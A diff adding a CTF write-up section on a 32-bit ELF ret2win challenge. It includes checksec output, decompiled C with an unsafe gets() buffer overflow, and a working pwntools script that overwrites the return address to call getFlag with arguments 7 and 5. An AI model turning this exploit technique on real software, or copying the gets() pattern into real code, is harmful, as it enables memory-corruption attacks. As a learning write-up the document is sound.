@@ -23,6 +23,7 @@ In this file, I’ll walk through the challenges I solved during the event, prov
 - [Challenge 11: Math For Me](#challenge-11-math-for-me)
 - [Challenge 12: Letter2nums](#challenge-12-letter2nums)
 - [Challenge 13: Echo](#Challenge-13-Echo)
+- [Challenge 14: Additional Information Needed](#Challenge-14-Additional-Information-Needed)
 - [Conclusion](#conclusion)
 ---
 
@@ -1195,6 +1196,125 @@ conn.interactive()
 Now you will see the flag returned to you (if this were a remote server, otherwise it will ask you to create a flag.txt file):
 
 ![image](https://github.com/user-attachments/assets/87e87207-7d02-4f5a-bfc0-82eaee138cce)
+
+---
+
+## Challenge 14: Additional Information Needed
+
+### Problem Description
+
+Author: @Soups71
+
+Another binary exploit challenge., but this time it's going to take some more information for me to give you what you want.
+
+Download the file(s) below.
+Attachments: challenge.elf
+
+### Solution
+
+Running file against the binary to determine it is an elf binary:
+```bash
+challenge.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),  
+dynamically linked, interpreter /lib/ld-linux.so.2,  
+BuildID[sha1]=9833fc45a97733715b43eee3beed3f38264ccf79,  
+for GNU/Linux 3.2.0, not stripped
+```
+
+Checking for protections with `pwn checksec challenge.elf`:
+```bash
+Arch: i386-32-little  
+RELRO: Partial RELRO  
+Stack: No canary found  
+NX: NX unknown - GNU_STACK missing  
+PIE: No PIE (0x8048000)  
+Stack: Executable  
+RWX: Has RWX segments  
+Stripped: No
+```
+
+Since there is no stack canary found we can overflow the buffer among other things. When you run the binary you will see: 
+
+![image](https://github.com/user-attachments/assets/28c4e4a7-ed14-4cf6-9e8e-6896229a9700)
+
+
+Examining the source code through GHIDRA, in the main function tells us that an insecure `GETS()` function is causing a buffer overflow:
+```c
+undefined4 main(void)  
+  
+{  
+char buffer [32];  
+  
+buffer_init();  
+puts("Welcome to this simple pwn challenge...");  
+puts("All you have to do is make a call to the `getFlag()` function. That\'s it!");  
+gets(buffer);  
+return 0;  
+}
+```
+
+Then there is the `getFlag()` function:
+```c
+undefined4 getFlag(int param_1,int param_2)  
+  
+{  
+undefined4 uVar1;  
+char local_3c [48];  
+FILE *local_c;  
+  
+if (param_1 * param_2 == 0x23) {  
+local_c = fopen("flag.txt","r");  
+if (local_c != (FILE *)0x0) {  
+fgets(local_3c,0x30,local_c);  
+puts(local_3c);  
+fclose(local_c);  
+}  
+uVar1 = 0;  
+}  
+else {  
+puts("Nope!");  
+uVar1 = 0xffffffff;  
+}  
+return uVar1;  
+}
+```
+
+Reading the contents of this function tells us that the multiplication of `0x23` (hexadecimal) or `35` in decimal, is what is required.
+
+This is a Ret2Win challenge with parameters:
+```python
+#!/usr/bin/env python3
+
+# Importing pwntools
+from pwn import *
+
+# Setting up the process for hte local binary, interacting with 'p' object
+p = process("./challenge.elf") # Or remote("host", port)  
+
+# p = remote('challenge.ctf.games', 31753)  
+
+# Load the elf binary
+elf = ELF('./challenge.elf')  
+
+# Getting the address of the getFlag function
+getflag_addr = elf.symbols['getFlag']  
+
+# Create a string of 40 characters of A to overflow the buffer
+# overwrite the return address
+# Convert the address of getFlag to a 32-bit little endian format to be used
+# as a return address. # Placeholder at p32(0x0) and maths for 35 expected num
+# to bypass the check for 5x7=35
+payload = b"A" * 40 + p32(getflag_addr) + p32(0x0) + p32(7) + p32(5)  
+
+# Sending the payload
+p.sendline(payload)  
+
+# Receive the output and decode it to a readable format
+print(p.recvall().decode())
+```
+
+Then we receive the flag as expected:
+
+![image](https://github.com/user-attachments/assets/59f8b737-fb23-469d-863d-aab2cccbe536)
 
 ---
 
